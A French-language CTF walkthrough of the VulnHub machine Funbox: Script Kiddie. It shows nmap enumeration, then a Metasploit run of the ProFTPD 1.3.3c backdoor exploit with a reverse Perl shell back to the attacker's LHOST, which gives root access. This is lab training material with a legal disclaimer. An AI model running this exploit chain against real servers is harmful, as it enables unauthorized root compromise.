---
title: "CTF Funbox: Script Kiddie"
date: 2021-08-15
tags: ["Pentest", "CTF"]
download: https://www.vulnhub.com/entry/funbox-scriptkiddie,725
parts: 
  - title: 'CTF Funbox: Easy'
    href: 'ctf-funbox-easy'
  - title: 'CTF Funbox: Script Kiddie'
---

## Avant propos

Le déroulé de ce hack a été réalisé sur une machine prévue à cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propriétaire.  
Ce CTF a été réalisé avec une machine attaquante **Kali 2021.2** (`lsb_release -r`).

## Enumération

On récupère l'adresse IP de la machine distante avec **Netdiscover** `sudo netdiscover`.  
Avant de poursuivre, on exporte cette adresse dans une variable pour être tranquille par la suite `export IP=192.168.1.17`.  
Puis on créé un dossier dédié à ce CTF `cd Documents/ctf && mkdir FunboxScriptKiddie && cd FunboxScriptKiddie`.  
On lance **Nmap** pour scanner les ports de la machine distante.

```bash
$ nmap -sV -sT -p- $IP -oN nmap.txt
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         ProFTPD 1.3.3c
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
25/tcp  open  smtp        Postfix smtpd
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
110/tcp open  pop3        Dovecot pop3d
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
```

On a une liste de 8 serveurs :

- **21** un serveur **FTP** ;
- **22** un serveur **SSH** ;
- **25** un serveur **SMTP** ;
- **80** un serveur **Apache** 2.4.18 ;
- **110** un serveur **POP3** ;
- **139** et **445** un serveur **Samba** ;
- **143** un serveur **IMAP**.

On check le serveur **FTP**.

```bash
$ ftp $IP
Connected to 192.168.1.17.
220 ProFTPD 1.3.3c Server (ProFTPD Default Installation) [192.168.1.17]
Name (192.168.1.17:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
530 Login incorrect.
Login failed.
ftp> exit
221 Goodbye.
```

Sans grand succès, par contre lorsque l'on regarde sur **searchsploit** pour **ProFTPD 1.3.3c**, on a un résultat exploitable avec **Metasploit**.

```bash
ProFTPd 1.3.3c - Compromised Source Backdoor Remote Code Execution | linux/remote/15662.txt
ProFTPd-1.3.3c - Backdoor Command Execution (Metasploit) | linux/remote/16921.rb
```

## Pénétration

On lance donc ce dernier via la commande **msfconsole**.

```bash
$ msfconsole
msf6 > search ProFTPd-1.3.3c
#  Name                                    Disclosure Date  Rank       Check  Description
-  ----                                    ---------------  ----       -----  -----------
0  exploit/unix/ftp/proftpd_133c_backdoor  2010-12-02       excellent  No     ProFTPD-1.3.3c Backdoor Command Execution
```

On retrouve bien l'exploit que l'on veut utiliser.

```bash
msf6 > use 0
```

Avant de poursuivre, on regarde les options disponibles.

```bash
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > show options
Name    Current Setting  Required  Description
----    ---------------  --------  -----------
RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
RPORT   21               yes       The target port (TCP)
```

On commence par renseigner l'IP de la machine distante dans la variable "RHOST".

```bash
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set RHOST 192.168.1.17
RHOST => 192.168.1.17
```

Puis on consulte la liste des payloads disponibles.

```bash
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > show payloads
#  Name                                        Disclosure Date  Rank    Check  Description
-  ----                                        ---------------  ----    -----  -----------
0  payload/cmd/unix/bind_perl                                   normal  No     Unix Command Shell, Bind TCP (via Perl)
1  payload/cmd/unix/bind_perl_ipv6                              normal  No     Unix Command Shell, Bind TCP (via perl) IPv6
2  payload/cmd/unix/generic                                     normal  No     Unix Command, Generic Command Execution
3  payload/cmd/unix/reverse                                     normal  No     Unix Command Shell, Double Reverse TCP (telnet)
4  payload/cmd/unix/reverse_bash_telnet_ssl                     normal  No     Unix Command Shell, Reverse TCP SSL (telnet)
5  payload/cmd/unix/reverse_perl                                normal  No     Unix Command Shell, Reverse TCP (via Perl)
6  payload/cmd/unix/reverse_perl_ssl                            normal  No     Unix Command Shell, Reverse TCP SSL (via perl)
7  payload/cmd/unix/reverse_ssl_double_telnet                   normal  No     Unix Command Shell, Double Reverse TCP SSL (telnet)
```

On choisit le reverse en PERL dans la variable "payload".

```bash
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set payload 5
payload => cmd/unix/reverse_perl
```

Et on n'oublie pas de renseigner l'IP la machine locale dans la variable "LHOST".

```bash
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set LHOST 192.168.1.33
LHOST => 192.168.1.33
```

Nos 3 valeurs renseignées, on peut exécuter l'exploit.

```bash
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > exploit
[*] Started reverse TCP handler on 192.168.1.33:4444 
[*] 192.168.1.17:21 - Sending Backdoor Command
[*] Command shell session 1 opened (192.168.1.33:4444 -> 192.168.1.17:44782) at 2021-08-15 10:58:28 +0200
```

L'exploit fonctionne car on est connecté sur le serveur **FTP**.

```bash
$ id
uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
```

On est directement utilisateur **root**. On lance un **shell** pour mieux naviguer sur la machine distante.

```bash
$ shell
[*] Trying to find binary 'python' on the target machine
[*] Found python at /usr/bin/python
[*] Using `python` to pop up an interactive shell
[*] Trying to find binary 'bash' on the target machine
[*] Found bash at /bin/bash
```

On trouve l'unique flag dans le répertoire de l'utilisateur **root**.

```bash
$ cat /root/root.txt
Please, tweet this to: @0815R2d2
Thank you...
```
